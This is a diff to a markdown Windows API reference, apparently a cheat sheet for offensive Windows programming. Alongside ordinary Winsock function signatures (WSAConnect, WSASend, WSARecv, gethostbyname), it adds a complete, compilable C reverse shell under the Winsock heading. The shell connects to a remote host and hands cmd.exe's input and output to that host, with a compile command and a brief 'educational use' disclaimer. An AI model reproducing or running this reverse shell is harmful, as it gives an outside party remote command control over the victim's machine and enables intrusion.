@@ -534,6 +534,113 @@ void OutputDebugStringA(
 ```
 
 ### Winsock
+```c
+/***
+ * Windows Reverse Shell
+ * Written by: snowcra5h@icloud.com (Mike Walker) 2023
+ * 
+ * This program establishes a reverse shell via the Winsock2 library. It is 
+ * designed to establish a connection to a specified remote server, and execute commands
+ * received from the server on the local machine, giving the server 
+ * control over the local machine.
+ * 
+ * Compile command (using MinGW on Wine):
+ * wine gcc.exe windows.c -o windows.exe -lws2_32
+ * 
+ * This code is intended for educational and legitimate penetration testing purposes only. 
+ * Please use responsibly and ethically.
+ *
+ * Based on Code By: Ma~Far$ (a.k.a. Yahav N. Hoffmann) 2016.
+ * https://www.sololearn.com/compiler-playground/c9QMueL0jHiy/#cpp
+ */
+
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <stdio.h>
+
+#pragma comment(lib, "ws2_32.lib")
+
+int main(int argc, char *argv[]) 
+{
+    WSADATA wsaData;
+    SOCKET socketDescriptor;
+    struct sockaddr_in serverInfo;
+    char ipAddress[16];
+    STARTUPINFO startupInfo;
+    PROCESS_INFORMATION processInfo;
+
+    if (argc != 3)
+    {
+        fprintf(stderr, "Usage: <RemoteHost> <RemotePort>\n");
+        return 1;
+    }
+
+    // Initialize Winsock
+    if (WSAStartup(MAKEWORD(2,2), &wsaData) != 0) 
+    {
+        fprintf(stderr, "Failed to initialize Winsock.\n");
+        return 1;
+    }
+
+    // Create a socket
+    socketDescriptor = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
+    if (socketDescriptor == INVALID_SOCKET)
+    {
+        fprintf(stderr, "Failed to create socket.\n");
+        WSACleanup();
+        return 1;
+    }
+    
+    struct hostent *host;
+    host = gethostbyname(argv[1]);
+    if (host == NULL)
+    {
+        fprintf(stderr, "Failed to get host.\n");
+        closesocket(socketDescriptor);
+        WSACleanup();
+        return 1;
+    }
+
+    strcpy(ipAddress, inet_ntoa(*(struct in_addr*)host->h_addr_list[0]));
+    
+    // Set up the server information
+    serverInfo.sin_family = AF_INET;
+    serverInfo.sin_port = htons(atoi(argv[2]));
+    serverInfo.sin_addr.s_addr = inet_addr(ipAddress);
+
+    // Connect to the server
+    if (WSAConnect(socketDescriptor, (SOCKADDR*)&serverInfo, sizeof(serverInfo), NULL, NULL, NULL, NULL) == SOCKET_ERROR)
+    {
+        fprintf(stderr, "Failed to connect.\n");
+        closesocket(socketDescriptor);
+        WSACleanup();
+        return 1;
+    }
+
+    // Prepare the structures for creating a new process
+    memset(&startupInfo, 0, sizeof(startupInfo));
+    startupInfo.cb = sizeof(startupInfo);
+    startupInfo.dwFlags = STARTF_USESTDHANDLES;
+    startupInfo.hStdInput = startupInfo.hStdOutput = startupInfo.hStdError = (HANDLE)socketDescriptor;
+
+    // Create a new process - command shell
+    if (!CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &startupInfo, &processInfo))
+    {
+        fprintf(stderr, "Failed to create process.\n");
+        closesocket(socketDescriptor);
+        WSACleanup();
+        return 1;
+    }
+
+    // Clean up
+    CloseHandle(processInfo.hProcess);
+    CloseHandle(processInfo.hThread);
+    closesocket(socketDescriptor);
+    WSACleanup();
+
+    return 0;  
+}
+```
 [WSAStartup](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsastartup)
 ```c
 int WSAStartup(
@@ -541,11 +648,78 @@ int WSAStartup(
     LPWSADATA lpWSAData
 ); // Initializes the Winsock library for an application. Must be called before any other Winsock functions.
 ```
-[WSACleanup](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-wsacleanup)
+[WSAConnect](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaconnect)
 ```c
-int WSACleanup(
-    void
-); // Terminates the use of the Winsock library. Must be called once per each successful WSAStartup call.
+int WSAConnect(
+    SOCKET s, // Descriptor identifying a socket.
+    const struct sockaddr* name, // Pointer to the sockaddr structure for the connection target.
+    int namelen, // Length of the sockaddr structure.
+    LPWSABUF lpCallerData, // Pointer to user data to be transferred during connection.
+    LPWSABUF lpCalleeData, // Pointer to user data transferred back during connection.
+    LPQOS lpSQOS, // Pointer to flow specs for socket s, one for each direction.
+    LPQOS lpGQOS // Pointer to flow specs for the socket group.
+); // Establishes a connection to another socket application.This function is similar to connect, but allows for more control over the connection process.
+```
+[WSASend](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasend)
+```c
+int WSASend(
+    SOCKET s, // Descriptor identifying a connected socket.
+    LPWSABUF lpBuffers, // Array of buffers for data to be sent.
+    DWORD dwBufferCount, // Number of buffers in the lpBuffers array.
+    LPDWORD lpNumberOfBytesSent, // Pointer to the number of bytes sent by this function call.
+    DWORD dwFlags, // Flags to modify the behavior of the function call.
+    LPWSAOVERLAPPED lpOverlapped, // Pointer to an overlapped structure for asynchronous operations.
+    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine // Pointer to the completion routine called when the send operation has been completed.
+); // Sends data on a connected socket.It can be used for both synchronous and asynchronous data transfer.
+```
+[WSARecv](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsarecv)
+```c
+int WSARecv(
+    SOCKET s, // Descriptor identifying a connected socket.
+    LPWSABUF lpBuffers, // Array of buffers to receive the incoming data.
+    DWORD dwBufferCount, // Number of buffers in the lpBuffers array.
+    LPDWORD lpNumberOfBytesRecvd, // Pointer to the number of bytes received by this function call.
+    LPDWORD lpFlags, // Flags to modify the behavior of the function call.
+    LPWSAOVERLAPPED lpOverlapped, // Pointer to an overlapped structure for asynchronous operations.
+    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine // Pointer to the completion routine called when the receive operation has been completed.
+); //Receives data from a connected socket, and can also be used for both synchronous and asynchronous data transfer.
+```
+[WSASendTo](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsasendto)
+```c
+int WSASendTo(
+    SOCKET s, // Descriptor identifying a socket.
+    LPWSABUF lpBuffers, // Array of buffers containing the data to be sent.
+    DWORD dwBufferCount, // Number of buffers in the lpBuffers array.
+    LPDWORD lpNumberOfBytesSent, // Pointer to the number of bytes sent by this function call.
+    DWORD dwFlags, // Flags to modify the behavior of the function call.
+    const struct sockaddr* lpTo, // Pointer to the sockaddr structure for the target address.
+    int iToLen, // Size of the address in lpTo.
+    LPWSAOVERLAPPED lpOverlapped, // Pointer to an overlapped structure for asynchronous operations.
+    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine // Pointer to the completion routine called when the send operation has been completed.
+); // Sends data to a specific destination, for use with connection - less socket types such as SOCK_DGRAM.
+```
+[WSARecvFrom](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsarecvfrom)
+```c
+int WSARecvFrom(
+    SOCKET s, // Descriptor identifying a socket.
+    LPWSABUF lpBuffers, // Array of buffers to receive the incoming data.
+    DWORD dwBufferCount, // Number of buffers in the lpBuffers array.
+    LPDWORD lpNumberOfBytesRecvd, // Pointer to the number of bytes received by this function call.
+    LPDWORD lpFlags, // Flags to modify the behavior of the function call.
+    struct sockaddr* lpFrom, // Pointer to an address structure that will receive the source address upon completion of the operation.
+    LPINT lpFromlen, // Pointer to the size of the lpFrom address structure.
+    LPWSAOVERLAPPED lpOverlapped, // Pointer to an overlapped structure for asynchronous operations.
+    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine // Pointer to the completion routine called when the receive operation has been completed.
+); //Receives data from a specific source, used with connection - less socket types such as SOCK_DGRAM.
+```
+[WSAAsyncSelect](https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-wsaasyncselect)
+```c
+int WSAAsyncSelect(
+    SOCKET s, // Descriptor identifying the socket.
+    HWND hWnd, // Handle to the window which should receive the message.
+    unsigned int wMsg, // Message to be received when an event occurs.
+    long lEvent // Bitmask specifying a group of conditions to be monitored.
+); // Requests Windows message - based notification of network events for a socket.
 ```
 [socket](https://docs.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-socket)
 ```c
@@ -609,6 +783,12 @@ int recv(
 int closesocket(
     SOCKET s
 ); //Closes a socket and frees its resources.
+```
+[gethostbyname](https://learn.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-gethostbyname)
+```c
+hostent* gethostbyname(
+    const char* name // either a hostname or an IPv4 address in dotted-decimal notation
+); // returns a pointer to a hostent struct. NOTE: Typically better to use getaddrinfo
 ```
 
 ### Registry Operations
